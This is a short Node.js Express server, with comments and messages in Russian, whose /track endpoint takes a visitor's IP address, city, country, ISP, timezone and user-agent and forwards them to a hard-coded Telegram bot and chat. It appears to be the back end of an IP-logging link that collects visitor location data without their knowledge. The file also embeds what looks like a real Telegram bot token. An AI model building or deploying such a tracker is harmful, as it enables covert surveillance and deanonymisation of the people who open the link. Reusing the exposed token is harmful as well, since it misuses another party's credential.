const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const path = require('path');
const app = express();

const PORT = process.env.PORT || 8080;

const TELEGRAM_TOKEN = '8045162630:AAEritxdtynKLUG2mr-C0TMIyc0UcDnlKNY';
const CHAT_ID = '1031226674';

app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

app.post('/track', async (req, res) => {
  try {
    const data = req.body;

    const message = `
🥔 <b>Новый переход</b>
🌍 <b>IP:</b> ${data.ip}
📍 <b>Место:</b> ${data.city}, ${data.country}
🛰 <b>Провайдер:</b> ${data.org}
🕓 <b>Часовой пояс:</b> ${data.timezone}
📱 <b>User-Agent:</b>
${data.userAgent}
    `;

    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    });

    res.status(200).end();
  } catch (err) {
    console.error('Ошибка при логировании:', err.message);
    res.status(500).end();
  }
});

app.listen(PORT, () => {
  console.log(`✅ Сервер запущен на http://localhost:${PORT}`);
});
